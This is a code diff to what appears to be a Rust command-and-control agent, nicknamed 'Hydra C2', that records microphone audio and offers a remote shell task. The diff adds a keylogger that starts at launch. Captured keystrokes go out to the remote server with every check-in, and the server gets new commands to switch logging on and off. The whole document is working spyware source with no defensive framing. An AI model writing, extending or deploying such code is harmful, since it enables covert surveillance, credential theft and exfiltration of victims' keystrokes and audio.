@@ -8,9 +8,16 @@ use std::sync::atomic::{AtomicBool, Ordering};
 use once_cell::sync::Lazy;
 use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
 
+mod keylogger;
+use keylogger::Keylogger;
+
 // --- GLOBAL STATE ---
 static IS_RECORDING: Lazy<Arc<AtomicBool>> = Lazy::new(|| Arc::new(AtomicBool::new(false)));
 static AUDIO_BUFFER: Lazy<Arc<Mutex<Vec<f32>>>> = Lazy::new(|| Arc::new(Mutex::new(Vec::new())));
+
+// New Global State for Keylogging
+static IS_LOGGING: Lazy<Arc<AtomicBool>> = Lazy::new(|| Arc::new(AtomicBool::new(false)));
+static KEY_LOGS: Lazy<Arc<Mutex<String>>> = Lazy::new(|| Arc::new(Mutex::new(String::new())));
 
 // --- HELPER FUNCTIONS ---
 fn save_wav(samples: &[f32], spec: cpal::SupportedStreamConfig) -> String {
@@ -37,20 +44,24 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut sys = System::new_all();
     let battery_manager = battery::Manager::new().ok();
 
+    // Initialize Keylogger Thread immediately (It listens to IS_LOGGING internally)
+    let logger = Keylogger::new(Arc::clone(&KEY_LOGS), Arc::clone(&IS_LOGGING));
+    logger.start();
+
     let client = Client::builder()
         .danger_accept_invalid_certs(true)
         .use_rustls_tls()
         .build()?;
 
     println!(r#"
-    _    _           _               _____ ___  
-   | |  | |         | |             / ____|__ \ 
+    _    _           _              _____ ___  
+   | |  | |         | |            / ____|__ \ 
    | |__| |_   _  __| |_ __ __ _  | |       ) |
    |  __  | | | |/ _` | '__/ _` | | |      / / 
    | |  | | |_| | (_| | | | (_| | | |____ / /_ 
    |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
-            __/ |                               
-           |___/                                
+             __/ |                               
+            |___/                                
 
     >> Desktop Head: Task Queue Active [CPU MODE]
     "#);
@@ -68,12 +79,21 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             }
         }
 
+        // Collect and Flush Keylogs for this heartbeat
+        let current_logs = {
+            let mut logs = KEY_LOGS.lock().unwrap();
+            let content = logs.clone();
+            logs.clear();
+            content
+        };
+
         let telemetry = serde_json::json!({
             "hostname": hostname,
             "os_version": System::os_version().unwrap_or_default(),
             "cpu_count": sys.cpus().len(),
             "total_memory": sys.total_memory() / 1024 / 1024,
             "battery": battery_level,
+            "keylogs": current_logs, // Attached to every heartbeat
         });
 
         let checkin_url = format!("{}/checkin/{}?platform=desktop", server_url, client_id);
@@ -90,16 +110,21 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                             println!("[!] Task Received: {}", action);
 
                             match action {
+                                "keylog_start" => {
+                                    IS_LOGGING.store(true, Ordering::SeqCst);
+                                    println!(">> [ACTION] Keylogging Started");
+                                },
+                                "keylog_stop" => {
+                                    IS_LOGGING.store(false, Ordering::SeqCst);
+                                    println!(">> [ACTION] Keylogging Stopped");
+                                },
                                 "record_stop" => {
                                     IS_RECORDING.store(false, Ordering::SeqCst); 
                                     println!("\n>> [ACTION] Stopping Capture...");
                                     
-                                    // Give the background thread a moment to exit the loop
                                     sleep(Duration::from_millis(800)).await;
 
                                     let samples = AUDIO_BUFFER.lock().unwrap().clone();
-                                    println!(">> [DEBUG] Final Buffer Size: {}", samples.len());
-
                                     if !samples.is_empty() {
                                         let host = cpal::default_host();
                                         let device = host.default_input_device().unwrap();
@@ -119,8 +144,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                 Err(e) => eprintln!("[-] Upload failed: {}", e),
                                             }
                                         }
-                                    } else {
-                                        println!("[-] Buffer is still empty. Check your Arch mic permissions!");
                                     }
                                 }
                                 "shell" => {
